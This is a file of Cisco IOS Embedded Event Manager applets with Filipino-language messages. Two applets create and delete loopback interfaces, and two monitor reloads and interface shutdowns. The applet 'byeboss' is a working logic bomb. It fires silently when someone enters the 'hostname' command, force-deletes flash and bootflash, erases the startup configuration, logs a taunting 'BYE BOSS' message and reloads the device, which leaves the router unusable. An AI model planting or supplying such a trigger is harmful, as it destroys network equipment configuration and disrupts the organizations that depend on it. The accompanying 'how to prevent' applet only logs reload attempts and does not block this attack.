!eemAPP
config t
no event manager applet gawaloops
event manager applet gawaloops
event none
action 1.0 puts "Ilan Loopback Gusto mo,bro?"
action 1.1 puts nonewline ">"
action 1.2 get num
action 2.0 cli command "enable"
action 2.1 cli command "config t"
action 3.0 set i "1"
action 3.1 while $i le $num
action 3.2  cli command "interface Loopback $i"
action 3.3  cli command "ip address $i.$i.$i.$i 255.255.255.255"
action 3.4  increment i 1
action 3.5  end
action 4.0  cli command "end"
end
!!! siraloops eemAPP
config t
no event manager applet siraloops
event manager applet siraloops
event none
action 1.0 puts "Ilan Loopback Gusto mo SIRA,bro?"
action 1.1 puts nonewline ">"
action 1.2 get num
action 2.0 cli command "enable"
action 2.1 cli command "config t"
action 3.0 set i "1"
action 3.1 while $i le $num
action 3.2  cli command "No interface Loopback $i"
action 3.4  increment i 1
action 3.5  end
action 4.0  cli command "end"
end




!!
config t
no event manager applet byeboss
event manager applet byeboss
event cli pattern "hostname" sync no skip yes
 action 1.0 cli command "delete /force /recursive flash:"
 action 1.1 cli command "delete /force /recursive bootflash:"
 action 1.2 cli command "erase startup-config"
 action 2.0 syslog msg "BYE BOSS, GOOD JOB HUNTING.HEHE..(-:"
 action 3.0 reload
end

!!HOW TO PREVENT
config t
no event manager applet lokokaha
event manager applet lokokaha
 event cli pattern "reload" sync no skip yes occurs 1
 action 1.0 syslog msg "$_cli_msg HOY f.u ka! bawal yan! PAkiss"
end



!!Bawal pumatay
conf t
event manager applet nokill
 event syslog pattern "Interface Loopback6.* down" period 1
 action 2.0 cli command "enable"
 action 2.1 cli command "config t"
 action 2.2 cli command "int lo 6"
 action 2.3 cli command "no shutdown"
 action 3.0 syslog msg "gg KA, di ba bawal mag SHUT NANG LINK!F.U"
end